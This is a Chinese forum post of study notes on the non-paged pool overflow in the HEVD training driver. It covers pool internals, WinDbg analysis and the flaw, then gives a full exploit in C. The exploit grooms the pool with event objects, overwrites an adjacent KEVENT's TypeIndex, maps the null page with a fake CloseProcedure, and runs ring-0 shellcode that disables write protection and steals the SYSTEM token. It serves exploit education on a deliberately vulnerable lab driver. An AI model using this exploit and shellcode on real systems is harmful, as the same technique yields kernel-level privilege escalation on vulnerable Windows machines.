> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271234.htm)

> [原创]HEVD 学习笔记之非换页内存池溢出漏洞

> 实验环境以及 HEVD 的介绍请看：[**HEVD 学习笔记之概述**](https://bbs.pediy.com/thread-270159.htm)  

一. 漏洞原理  

==========

和堆管理器有点类似，在内核中也有个池管理器来管理池内存的分配回收等等。创建的堆对象的信息记录在 HEAP 结构中，而池对象的信息则是在结构_POOL_DESCRIPTOR 中，该结构定义如下：  

```
0: kd> dt _POOL_DESCRIPTOR
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY

```

_POOL_DESCRIPTOR 中也有个空闲链表，即最后一个成员 ListHeads 双向链表数组，该数组用来连接不同大小的空闲池内存，如下图所示：

![](https://bbs.pediy.com/upload/attach/202201/95RBGK68ZYZXU9W.jpg)

在池内存前也有一个结构用来描述内存池，该结构是_POOL_HEADER，占八个字节，定义如下：

```
0: kd> dt _POOL_HEADER
nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 9 Bits
   +0x000 PoolIndex        : Pos 9, 7 Bits
   +0x002 BlockSize        : Pos 0, 9 Bits
   +0x002 PoolType         : Pos 9, 7 Bits
   +0x000 Ulong1           : Uint4B
   +0x004 PoolTag          : Uint4B
   +0x004 AllocatorBackTraceIndex : Uint2B
   +0x006 PoolTagHash      : Uint2B

```

全局变量 PoolVector[2] 数组则分别保存了非分页池对象的地址和分页池对象的地址，其中 PoolVector[0] 中保存的是非分页池对象的地址。因此，可以在调试器 WinDbg 中查看到此时的非分页池对象地址是 0x83F7F940

```
0: kd> dd PoolVector
83f84bb0  83f7f940 8633f000 00000000 00000000
83f84bc0  00000000 00000000 00000000 00000000
83f84bd0  00000000 00000000 00000000 00000000
83f84be0  00000000 00000000 00000000 00000000
83f84bf0  00000000 00000000 00000000 00000000
83f84c00  00000001 00000040 00000000 00010000
83f84c10  87b4e000 00000000 00000000 000007ff
83f84c20  00000801 86314000 00000000 00000000

```

根据此就可以找到非分页池对象

```
0: kd> dt _POOL_DESCRIPTOR 83f7f940
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : 0 ( NonPagedPool )
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : 0
   +0x040 RunningAllocs    : 0n850461
   +0x044 RunningDeAllocs  : 0n779329
   +0x048 TotalBigPages    : 0n4896
   +0x04c ThreadsProcessingDeferrals : 0n0
   +0x050 TotalBytes       : 0x1c4fa40
   +0x080 PoolIndex        : 0
   +0x0c0 TotalPages       : 0n3119
   +0x100 PendingFrees     : 0x87f5ae10  -> 0x87a723c0 Void
   +0x104 PendingFreeDepth : 0n10
   +0x140 ListHeads        : [512] _LIST_ENTRY [ 0x83f7fa80 - 0x83f7fa80 ]

```

接着就可以查看 ListHeads 链表的情况：  

```
0: kd> dd 83f7f940 + 140
83f7fa80  83f7fa80 83f7fa80 879138b8 87928a68
83f7fa90  87f6c1f0 8818e070 87aebbb0 87c824b0
83f7faa0  86fa2758 8790a0c0 87c9d850 87c8d200
83f7fab0  87def140 87f19920 88240c28 87e31db0
83f7fac0  87cdf668 87cc4348 881920b0 87d1f1d0
83f7fad0  87af2a10 879d65b8 87e4cbb8 881d32d0
83f7fae0  881d18e0 87f59788 879ce308 8820dca0
83f7faf0  87a57f90 880b8138 87df0d70 87e2a1c8

```

可以看到和堆对象的空闲链表不同，非分页池对象的空闲链表已经挂入了多个空闲块。  

以下代码先申请了 3 个 4080 大小的的非分页内存块，接着释放第二个内存块，然后再次申请第二个块，看看它的表现和对管理器有何不同

```
#include  VOID ShowError(PCHAR msg, NTSTATUS status);
VOID DriverUnload(IN PDRIVER_OBJECT driverObject);
 
NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)
{
    NTSTATUS status = STATUS_SUCCESS;
    PVOID h1 = NULL, h2 = NULL, h3 = NULL;
     
    DbgPrint("驱动加载成功\r\n");
    h1 = ExAllocatePool(NonPagedPool, 4080);
    if (!h1)
    {
        ShowError("ExAllocatePool h1", 0);
        goto exit;
    }
 
    h2 = ExAllocatePool(NonPagedPool, 4080);
    if (!h2)
    {
        ShowError("ExAllocatePool h2", 0);
        goto exit;
    }
     
    h3 = ExAllocatePool(NonPagedPool, 4080);
    if (!h3)
    {
        ShowError("ExAllocatePool h3", 0);
        goto exit;
    }
 
    DbgPrint("Allocate ok\r\n");
    DbgPrint("h1:0x%X\r\n", (UINT32)h1);
    DbgPrint("h2:0x%X\r\n", (UINT32)h2);
    DbgPrint("h3:0x%X\r\n", (UINT32)h3);
 
    __asm int 3
 
    ExFreePool(h2);
    DbgPrint("Free h2\r\n");
 
    h2 = ExAllocatePool(NonPagedPool, 4080);
    if (!h2)
    {
        ShowError("ExAllocatePool h2", 0);
        goto exit;
    }
 
exit:
    driverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
 
VOID ShowError(PCHAR msg, NTSTATUS status)
{
    DbgPrint("%s Error 0x%X\n", msg, status);
}
 
VOID DriverUnload(IN PDRIVER_OBJECT driverObject)
{
    DbgPrint("驱动卸载完成\r\n");
} 
```

程序中断到 int 3 指令的时候，可以看到申请的三个内存块的地址，不难看出这三个块并没有相邻  

![](https://bbs.pediy.com/upload/tmp/835440_QVFM2U5AYWXKA2J.jpg)

继续运行下去，当释放了 h2 以后发现，此时并没有把 h2 的内存块挂入到空闲链表 ListHeads[511] 中，因此可以推测，应该是发生了堆块的合并操作  

![](https://bbs.pediy.com/upload/tmp/835440_FVP9STWH3NWM3MU.jpg)

基于上面的内容，不难想到内存池的溢出攻击和堆的溢出攻击是不一样的，不能通过淹没下一个池内存块来达成攻击。因为，内存池在你驱动加载运行之前就已经被频繁使用。因此，需要通过其他的办法来利用这个漏洞。  

二. 漏洞分析  

==========

在 HEVD 中，该漏洞位于函数地址表中的第四个函数 BufferOverflowNonPagedPollIoctlHandler 中，因此，IOCTRL 为 0x222003 + 3 * 4。该函数将输入缓冲区的大小和输入缓冲区入栈以后就调用了 TriggerBufferOverflowNonPagedPool 函数  

```
PAGE:00444CAA ; int __stdcall BufferOverflowNonPagedPoolIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
PAGE:00444CAA _BufferOverflowNonPagedPoolIoctlHandler@8 proc near
PAGE:00444CAA                                         ; CODE XREF: IrpDeviceIoCtlHandler(x,x)+C5↑p
PAGE:00444CAA
PAGE:00444CAA Irp             = dword ptr  8
PAGE:00444CAA IrpSp           = dword ptr  0Ch
PAGE:00444CAA
PAGE:00444CAA                 push    ebp
PAGE:00444CAB                 mov     ebp, esp
PAGE:00444CAD                 mov     eax, [ebp+IrpSp]
PAGE:00444CB0                 mov     ecx, STATUS_UNSUCCESSFUL
PAGE:00444CB5                 mov     edx, [eax+_IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer]
PAGE:00444CB8                 mov     eax, [eax+_IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength]
PAGE:00444CBB                 test    edx, edx
PAGE:00444CBD                 jz      short loc_444CC8
PAGE:00444CBF                 push    eax             ; Size
PAGE:00444CC0                 push    edx             ; UserBuffer
PAGE:00444CC1                 call    _TriggerBufferOverflowNonPagedPool@8 ; TriggerBufferOverflowNonPagedPool(x,x)
PAGE:00444CC6                 mov     ecx, eax
PAGE:00444CC8
PAGE:00444CC8 loc_444CC8:                             ; CODE XREF: BufferOverflowNonPagedPoolIoctlHandler(x,x)+13↑j
PAGE:00444CC8                 mov     eax, ecx
PAGE:00444CCA                 pop     ebp
PAGE:00444CCB                 retn    8
PAGE:00444CCB _BufferOverflowNonPagedPoolIoctlHandler@8 endp

```

TriggerBufferOverflowNonPagedPool 函数的执行内容很简单，申请一块 0x1F8 大小的非分页内存块，然后将输入缓冲区中的数据复制到这块非分页内存中去。但是这里调用的 memcpy 函数指定的是输入缓冲区的长度，而这个长度这个函数没有验证是不是合法的，也就是是不是超过了 0x1F8。如果超过了这个大小，直接复制就会导致数据溢出申请的非分页内存池，造成漏洞

![](https://bbs.pediy.com/upload/tmp/835440_WXGWAB3XDBH8MB8.jpg)

接下来用下面的代码进行探测，首先输入的缓冲区的大小是符合要求的 0x1F8  

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include  #include  #include  #define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define INPUT_BUFFER_LENGTH 0x1F8             // 符合大小
 
void ShowError(PCHAR msg, DWORD ErrorCode);
 
int main()
{
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    CONST DWORD dwIoCtl = 0x222003 + 3 * 4;
 
        // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                 GENERIC_READ | GENERIC_WRITE,
                 0,
                 NULL,
                 OPEN_EXISTING,
                 FILE_ATTRIBUTE_NORMAL,
                 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ShowError("CreateFile", GetLastError());
        goto exit;
    }
 
    char szInput[INPUT_BUFFER_LENGTH] = { 0 };
 
    memset(szInput, 'A', INPUT_BUFFER_LENGTH);
    if (!DeviceIoControl(hDevice,
                 dwIoCtl,
                 szInput,
                 INPUT_BUFFER_LENGTH,
                 NULL,
                 0,
                 &dwReturnLength,
                 NULL))
    {
        ShowError("DeviceIoControl", GetLastError());
        goto exit;
    }
exit:
    if (hDevice) CloseHandle(hDevice);
    system("pause");
 
    return 0;
}
 
void ShowError(PCHAR msg, DWORD ErrorCode)
{
    printf("%s Error 0x%X\n", msg, ErrorCode);
} 
```

在 memcpy 函数中下断点，然后运行 exp，中断下来以后可以看到非分页池内存的情况

![](https://bbs.pediy.com/upload/tmp/835440_7WF8X8T8SNSEA4P.jpg)

![](https://bbs.pediy.com/upload/tmp/835440_GPVCTQERTSHW92T.jpg)

由于申请到的非分页池需要八个字节的_POOL_HEADER 描述，因此此时块的其实地址是 KernelBuffer - 8 的地址且块的大小是 0x1F8 + 8 = 0x200。继续向下运行，也就是执行完 memcpy 之后，继续看内存池情况，由于此时并没有超过申请的内存池的大小，所以相邻的非分页内存也没有被覆盖掉，程序会正常运行

![](https://bbs.pediy.com/upload/tmp/835440_JE6CQEMBJP5WAWM.jpg)

而这里也可以看到申请的这块非分页内存池后面跟了其他的对象，因为 0x863793B8 + 0x200=0x863795B8。如果输入数据大于 0x1F8，那么就会淹没其随后的数据，造成错误。

修改输入数据的大小超过 0x1F8

```
#define INPUT_BUFFER_LENGTH 0x200

```

重复上面步骤，这次复制完以后在查非分页内存池就会报错，随后也会出现蓝屏  

![](https://bbs.pediy.com/upload/tmp/835440_NX7RQT94PH47FPQ.jpg)

到这里基本可以知道，该漏洞产生的原因是将数据复制到申请的非分页内存中的时候，没有对输入数据长度进行检验，导致输入数据淹没到其他地方导致了系统的错误。  

三. 漏洞利用  

==========

想要利用这个漏洞就存在一个问题是，我们无法预先知道和设置分配的这 0x1F8(算上_POOL_HEADER 是 0x200) 的非分页池内存随后的数据。因此非分页池内存在驱动加载之前就已经被使用了多次，此时这块内存中分散保存了多种多样的不同大小的数据。我们甚至无法知道我们要分配的非分页内存是从空闲链表中摘除下来，还是从更大快的内存块中切出来。

解决的办法是通过在用户层调用 CreateEvent 函数，该函数会在内核中创建事件对象_KEVENT，该对象会占用 0x40 字节的非分页内存。当创建足够多的事件对象的时候，首先当然是先从空闲链表中找到可以足够大的内存块来保存这是事件对象。当这些内存块用完以后，接下来继续申请的事件对象就会在内存中按照地址顺序排列下来。

而这个时候，我们如果释放按照地址顺序保存的事件对象，那么就会因为内存块的合并产生一个大的块。也就是说，如果释放了 8 个连续地址保存的事件对象，就会产生一个 0x200 大小的内存块，此时在进行内存申请，就会获得这个内存块，且后面跟着的是事件对象。

下图说明了这一过程，假设创建第 100 个事件对象的时候，足够容纳 0x40 大小事件对象的空闲内存块被使用完了，那么接下来申请的事件对象，也就是事件对象 100 到事件对象 108 的内存是紧邻着的，此时释放到事件对象 100 到事件对象 107 这 8 个对象，就会产生一块 0x200 大小的内存块。此时，在调用函数申请内存的时候就会获得这个 0x200 的内存块，而这个紧随内存块后面保存的是事件对象 108

![](https://bbs.pediy.com/upload/attach/202201/835440_FGET37BMRA2HVNR.jpg)

根据玉涵师傅翻译的文章，这里会首先创建 10000 个事件对象来消耗空闲内存块，然后再申请 5000 个对象，这 5000 个对象就会有连续分配的事件对象，接下来就用以下的代码进行测试

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include  #include  #include  #define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define INPUT_BUFFER_LENGTH 0x1F8
#define EVENT_UNUSED_NUMBER 10000     // 消耗空闲内存块要创建的事件对象数量
#define EVENT_NUMBER 5000             // 事件对象数量，用来生成连续的内存
 
void ShowError(PCHAR msg, DWORD ErrorCode);
 
int main()
{
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    CONST DWORD dwIoCtl = 0x222003 + 3 * 4;
    HANDLE hEvent[EVENT_NUMBER + 5];
 
    // 消耗空闲内存块
    for (DWORD i = 0; i < EVENT_UNUSED_NUMBER; i++)
    {
        CreateEvent(NULL, FALSE, FALSE, NULL);
    }
 
    // 获得连续的内存块
    for (DWORD i = 0; i < EVENT_NUMBER; i++)
    {
        hEvent[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
    }
 
    printf("事件对象创建完成\n");
 
    // 每9个事件对象中释放前8个
    DWORD dwNum = EVENT_NUMBER / 9;
    for (DWORD i = 0; i < dwNum; i++)
    {
        for (DWORD j = 0; j < 8; j++)
        {
            CloseHandle(hEvent[i * 9 + j]);
        }
    }
 
    // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                 GENERIC_READ | GENERIC_WRITE,
                 0,
                 NULL,
                 OPEN_EXISTING,
                 FILE_ATTRIBUTE_NORMAL,
                 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ShowError("CreateFile", GetLastError());
        goto exit;
    }
 
    char szInput[INPUT_BUFFER_LENGTH] = { 0 };
 
    memset(szInput, 'A', INPUT_BUFFER_LENGTH);
    if (!DeviceIoControl(hDevice,
               dwIoCtl,
               szInput,
               INPUT_BUFFER_LENGTH,
               NULL,
               0,
               &dwReturnLength,
               NULL))
    {
        ShowError("DeviceIoControl", GetLastError());
        goto exit;
    }
 
 
exit:
    if (hDevice) CloseHandle(hDevice);
    system("pause");
 
    return 0;
}
 
void ShowError(PCHAR msg, DWORD ErrorCode)
{
    printf("%s Error 0x%X\n", msg, ErrorCode);
} 
```

在事件对象创建完成以后下断点

![](https://bbs.pediy.com/upload/tmp/835440_KJHB8GRDH37B4R6.jpg)

从句柄表中查看最后的几个事件对象，可以看到这些对象地址相差 0x40 字节，因此这些对象是在连续的地址空间中  

![](https://bbs.pediy.com/upload/tmp/835440_SBHB85XCJU8BMX4.jpg)

继续向下运行，此时在看申请到的内存块，后面跟着的就会是事件对象了

![](https://bbs.pediy.com/upload/tmp/835440_833ZE6XSQDKY5KC.jpg)

现在已经可以做到驱动程序申请的非分页内存后跟着的是保存 0x40 大小的事件对象的非分页内存。而这 0x40 大小的非分页内存包含了 0x8 大小的_POOL_HEADER 结构以及事件对象本身，其中_POOL_HEADER 结构输出如下：

```
1: kd> dt _POOL_HEADER 881b2918
nt!_POOL_HEADER
   +0x000 PreviousSize     : 0y001000000 (0x40)
   +0x000 PoolIndex        : 0y0000000 (0)
   +0x002 BlockSize        : 0y000001000 (0x8)
   +0x002 PoolType         : 0y0000010 (0x2)
   +0x000 Ulong1           : 0x4080040
   +0x004 PoolTag          : 0xee657645
   +0x004 AllocatorBackTraceIndex : 0x7645
   +0x006 PoolTagHash      : 0xee65

```

而实际对象本身又包括了可选对象头，对象头以及对象体，如下图所示（在不同的系统中，结构中的成员会有所不同，但是结构是相同的）：  

![](https://bbs.pediy.com/upload/attach/202201/2Z72NX2C8R2PJXX.jpg)

而事件对象的对象体中只包含了 0x10 字节大小的分发器对象  

```
1: kd> dt _KEVENT
ks!_KEVENT
   +0x000 Header           : _DISPATCHER_HEADER
1: kd> dt _DISPATCHER_HEADER
ks!_DISPATCHER_HEADER
   +0x000 Type             : UChar
   +0x001 TimerControlFlags : UChar
   +0x001 Absolute         : Pos 0, 1 Bit
   +0x001 Coalescable      : Pos 1, 1 Bit
   +0x001 KeepShifting     : Pos 2, 1 Bit
   +0x001 EncodedTolerableDelay : Pos 3, 5 Bits
   +0x001 Abandoned        : UChar
   +0x001 Signalling       : UChar
   +0x002 ThreadControlFlags : UChar
   +0x002 CpuThrottled     : Pos 0, 1 Bit
   +0x002 CycleProfiling   : Pos 1, 1 Bit
   +0x002 CounterProfiling : Pos 2, 1 Bit
   +0x002 Reserved         : Pos 3, 5 Bits
   +0x002 Hand             : UChar
   +0x002 Size             : UChar
   +0x003 TimerMiscFlags   : UChar
   +0x003 Index            : Pos 0, 1 Bit
   +0x003 Processor        : Pos 1, 5 Bits
   +0x003 Inserted         : Pos 6, 1 Bit
   +0x003 Expired          : Pos 7, 1 Bit
   +0x003 DebugActive      : UChar
   +0x003 ActiveDR7        : Pos 0, 1 Bit
   +0x003 Instrumented     : Pos 1, 1 Bit
   +0x003 Reserved2        : Pos 2, 4 Bits
   +0x003 UmsScheduled     : Pos 6, 1 Bit
   +0x003 UmsPrimary       : Pos 7, 1 Bit
   +0x003 DpcActive        : UChar
   +0x000 Lock             : Int4B
   +0x004 SignalState      : Int4B
   +0x008 WaitListHead     : _LIST_ENTRY

```

根据这些不难找到事件对象的对象头  

```
1: kd> dt  _OBJECT_HEADER 881b2930
nt!_OBJECT_HEADER
   +0x000 PointerCount     : 0n1
   +0x004 HandleCount      : 0n1
   +0x004 NextToFree       : 0x00000001 Void
   +0x008 Lock             : _EX_PUSH_LOCK
   +0x00c TypeIndex        : 0xc ''
   +0x00d TraceFlags       : 0 ''
   +0x00e InfoMask         : 0x8 ''
   +0x00f Flags            : 0 ''
   +0x010 ObjectCreateInfo : 0x86b857c0 _OBJECT_CREATE_INFORMATION
   +0x010 QuotaBlockCharged : 0x86b857c0 Void
   +0x014 SecurityDescriptor : (null) 
   +0x018 Body             : _QUAD

```

和 xp 下的对象头不同，win7 的对象头用偏移 0x0E 的 InfoMask 来指定可选对象头，其中的数值如下：

<table border="1"><tbody><tr><td valign="top"><strong>名称</strong></td><td valign="top"><strong>掩码</strong></td><td valign="top"><strong>大小</strong></td></tr><tr><td valign="top">Process Info</td><td valign="top">0x10</td><td valign="top">0x08</td></tr><tr><td valign="top">Quota Info</td><td valign="top">0x08</td><td valign="top">0x10</td></tr><tr><td valign="top">Handle Info</td><td valign="top">0x04</td><td valign="top">0x08</td></tr><tr><td valign="top">Name Info</td><td valign="top">0x02</td><td valign="top">0x10</td></tr><tr><td valign="top">Creator Info</td><td valign="top">0x01</td><td valign="top">0x10</td></tr></tbody></table>

上面的 InfoMask 输出为 0x8，因此在对象头的上方保存了 0x10 字节的配额对象头，因此可获得如下查询结果  

```
1: kd> dt  _OBJECT_HEADER_QUOTA_INFO 881b2920
nt!_OBJECT_HEADER_QUOTA_INFO
   +0x000 PagedPoolCharge  : 0
   +0x004 NonPagedPoolCharge : 0x40
   +0x008 SecurityDescriptorCharge : 0
   +0x00c SecurityDescriptorQuotaBlock : (null)

```

每个对象都有相应的对象类型，使用_OBJECT_TYPE 结构来描述。在 xp 系统中是使用对象头中的 Type 字段获得。而 Win7 系统中，则是保存在全局变量 ObTypeIndexTable 中，该变量是一个数组，数组中的每个元素都保存了对象类型的地址。对象头中的字段 TypeIndex 指定该对象头在 ObTypeIndexTable 中的下标，此处的输出是 0x0C，因此可以从 WinDbg 中获取

![](https://bbs.pediy.com/upload/tmp/835440_9BKCY6MXJBA8FA6.jpg)

获取到对象类型的地址以后，就可以解析出对象类型  

![](https://bbs.pediy.com/upload/attach/202201/835440_NN3WC3X48ETAH42.jpg)

其中偏移 0x028 中保存的是_OBJECT_TYPE_INITIALIZER 类型的 TypeInfo，对其解析可以得到如下内容：  

![](https://bbs.pediy.com/upload/attach/202201/835440_7EBMXJZ8WMR94EX.jpg)

在该结构中从偏移 0x030 开始就保存了各种回调例程，其中的 CloseProcedure 指定了当 Event 对象被释放的时候要调用的例程。  

> 到这里对目前的内容做个总结：  
> 
> *   我们已经可以保证驱动申请的 0x200 大的非分页内存后面跟着的是事件对象
>     
> *   事件对象的对象头中的偏移 0x0C 保存的 TypeIndex 是对象类型的索引，根据该索引可以从 ObTypeIndexTable 中找到对象类型
>     
> *   事件对象类型中的偏移 0x60 保存了释放对象的例程
>     

另外还需要补充的是 ObTypeIndexTable 第 0 项保存的是 0

![](https://bbs.pediy.com/upload/attach/202201/835440_QHEQH2BKY65ADDT.jpg)

基于以上这个漏洞的利用如下：

*   我们可以确定申请的 0x200 大小的内存页后面是事件对象，所以我们就可以淹没这个事件对象的 TypeIndex，将其设为 0
    
*   这样这个事件对象就会从 0 地址处找对象类型，而 0 地址正常情况无法访问，那么我们可以在 0 地址申请一块内存放置一块我们自己构造的事件对象
    
*   这个构造的事件对象偏移 0x60 的 CloseProcedure 此时就可以由我们指定，我们可以将其指定为 ShellCode 的地址
    
*   这样，当程序调用 CloseHandle 关闭句柄的时候，就会调用这个关闭例程，也就会执行 ShellCode  
    

但是在 0 地址其实并不需要构造一个完整的事件对象类型，因为我们只是要用到 CloseProduce 例程，所以申请到 0 地址以后，直接在 0x60 处写入 ShellCode 地址就好了。剩下的一个问题就是构造一个事件对象用来覆盖掉申请的 0x200 大小的非分页内存池后面的事件对象，这个事件对象的 TypeIndex 要指定为 0，这样才会去 0 地址解析事件对象类型。

根据上面 WinDbg 的输出应该是不难构造的，完整的 exp 如下：  

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include  #include  #include  #include "ntapi.h"
#pragma comment(linker, "/defaultlib:ntdll.lib")
 
#define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define PAGE_SIZE 0x1000
#define KERNEL_NAME_LENGTH 0X0D
 
#define INPUT_BUFFER_LENGTH 0x1F8     // 淹没申请的内存池空间
#define EVENT_SIZE 0x40            // 要淹没的事件对象大小
#define EVENT_UNUSED_NUMBER 10000     // 消耗空闲内存块要创建的事件对象数量
#define EVENT_NUMBER 5000         // 事件对象数量，用来生成连续的内存
 
// 定义这些结构体用来填充要覆盖的EVENT对象
#pragma pack(1)
typedef struct _POOL_HEADER
{
    DWORD uLong1;
    DWORD PoolTag;
}POOL_HEADER;
 
typedef struct _OBJECT_HEADER_QUOTA_INFO
{
    DWORD PagedPoolCharge;
    DWORD NonPagedPoolCharge;
    DWORD SecurityDescriptorChage;
    DWORD SecurityDescriptorQuotaBlock;
}OBJECT_HEADER_QUOTA_INFO;
 
typedef struct _KEVENT_BODY
{
    DWORD Member[4];
}KEVENT_BODY;
 
typedef struct _OBJECT_HEADER
{
    DWORD PointerCount;
    DWORD HandleCount;
    DWORD Lock;
    UCHAR TypeIndex;
    UCHAR TraceFlags;
    UCHAR InfoMask;
    UCHAR Flags;
    DWORD ObjectCreateInfo;
    DWORD SecurityDescriptor;
    KEVENT_BODY Body;
}OBJECT_HEADER;
 
typedef struct _KEVENT
{
    POOL_HEADER PoolHeader;
    OBJECT_HEADER_QUOTA_INFO ObjectQuotaHeader;
    OBJECT_HEADER ObjectHeader;
}KEVENT, *PKEVENT;
#pragma pack()
 
HANDLE g_hEvent[EVENT_NUMBER + 5];       // 保存连续分配的事件对象
bool g_bIsExecute = false;           // 判断shellcode是否执行
 
void AllocateEvent();      // 申请事件对象
bool SetZeroMemory();      // 向0地址写入构造的对象类型
NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength);
void ShowError(PCHAR msg, DWORD ErrorCode);
 
 
int main()
{
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    CONST DWORD dwIoCtl = 0x222003 + 3 * 4;
 
    AllocateEvent();
 
    if (!SetZeroMemory())
    {
        goto exit;
    }
 
    // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ShowError("CreateFile", GetLastError());
        goto exit;
    }
 
    char szInput[INPUT_BUFFER_LENGTH + EVENT_SIZE] = { 0 };
 
    // 填充分配的0x1F8大小的内存
    memset(szInput, 'A', INPUT_BUFFER_LENGTH);
 
    // 构造覆盖随后的KEVENT对象
    PKEVENT kEvent = (PKEVENT)(szInput + INPUT_BUFFER_LENGTH);
 
    kEvent->PoolHeader.uLong1 = 0x04080040;
    kEvent->PoolHeader.PoolTag = 0xee657645;
     
    kEvent->ObjectQuotaHeader.PagedPoolCharge = 0x0;
    kEvent->ObjectQuotaHeader.NonPagedPoolCharge = 0x40;
    kEvent->ObjectQuotaHeader.SecurityDescriptorChage = 0x0;
    kEvent->ObjectQuotaHeader.SecurityDescriptorQuotaBlock = 0x0;
 
    kEvent->ObjectHeader.PointerCount = 0x01;
    kEvent->ObjectHeader.HandleCount = 0x01;
    kEvent->ObjectHeader.Lock = 0x00;
    kEvent->ObjectHeader.TypeIndex = 0x00;    // TypeIndex指定为0
    kEvent->ObjectHeader.InfoMask = 0x08;
    kEvent->ObjectHeader.Flags = 0x00;
 
    if (!DeviceIoControl(hDevice,
               dwIoCtl,
               szInput,
               INPUT_BUFFER_LENGTH + EVENT_SIZE,
               NULL,
               0,
               &dwReturnLength,
               NULL))
    {
        ShowError("DeviceIoControl", GetLastError());
        goto exit;
    }
 
    // 释放事件对象，这里面的某个被淹没掉了，所以会触发ShellCode
    for (DWORD i = 0; i < EVENT_NUMBER; i++)
    {
        if (g_hEvent[i])
        {
            CloseHandle(g_hEvent[i]);
            g_hEvent[i] = NULL;
        }
    }
 
    if (g_bIsExecute)
    {
        printf("ShellCode执行完成\n");
        system("whoami");
    }
exit:
    if (hDevice) CloseHandle(hDevice);
     
    system("pause");
 
    return 0;
}
 
bool SetZeroMemory()
{
    NTSTATUS status = STATUS_SUCCESS;
    PVOID pZeroAddress = NULL;
    DWORD dwZeroSize = PAGE_SIZE;
    bool bRet = true;
 
    // 获得0地址的内存
    pZeroAddress = (PVOID)sizeof(ULONG);
    status = NtAllocateVirtualMemory(NtCurrentProcess(),
                      &pZeroAddress,
                      0,
                      &dwZeroSize,
                      MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
                      PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        printf("NtAllocateVirtualMemory Error 0x%X\n", status);
        bRet = false;
        goto exit;
    }
 
    // 指定CloseProdure为shellcode的地址
    *(PDWORD)0x60 = (DWORD)Ring0ShellCode;
 
exit:
    return bRet;
}
 
void AllocateEvent()
{
    // 消耗空闲内存块
    for (DWORD i = 0; i < EVENT_UNUSED_NUMBER; i++)
    {
        CreateEvent(NULL, FALSE, FALSE, NULL);
    }
 
    // 获得连续的内存块
    for (DWORD i = 0; i < EVENT_NUMBER; i++)
    {
        g_hEvent[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
    }
 
    printf("事件对象创建完成\n");
 
    // 每9个事件对象中释放前8个
    DWORD dwNum = EVENT_NUMBER / 9;
    for (DWORD i = 0; i < dwNum; i++)
    {
        for (DWORD j = 0; j < 8; j++)
        {
            if (g_hEvent[i * 9 + j])
            {
                CloseHandle(g_hEvent[i * 9 + j]);
                g_hEvent[i * 9 + j] = NULL;
            }
        }
    }
}
 
NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
    // 关闭页保护
    __asm
    {
        cli
        mov eax, cr0
        and eax, ~0x10000
        mov cr0, eax
    }
 
    __asm
    {
        // 取当前线程
        mov eax, fs:[0x124]
        // 取线程对应的EPROCESS
        mov esi, [eax + 0x150]
        mov eax, esi
        searchWin7 :
        mov eax, [eax + 0xB8]
        sub eax, 0x0B8
        mov edx, [eax + 0xB4]
        cmp edx, 0x4
        jne searchWin7
        mov eax, [eax + 0xF8]
        mov[esi + 0xF8], eax
    }
 
    // 开起页保护
    __asm
    {
        mov eax, cr0
        or eax, 0x10000
        mov cr0, eax
        sti
    }
 
    g_bIsExecute = true;
}
 
void ShowError(PCHAR msg, DWORD ErrorCode)
{
    printf("%s Error 0x%X\n", msg, ErrorCode);
} 
```

可以看到，最终成功执行 shellcode，提取成功

![](https://bbs.pediy.com/upload/attach/202201/835440_6GP3RR4PD3KS366.jpg)

四. 参考资料  

==========

> *   [**Windows exploit 开发系列教程第十六部分：内核利用程序之池溢出**](https://bbs.pediy.com/thread-225182.htm)
>     
> *   [**HEVD 非换页池溢出**](https://50u1w4y.github.io/site/HEVD/nonPagedpooloverflow/)  
>     

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

最后于 14 小时前 被 1900 编辑 ，原因：

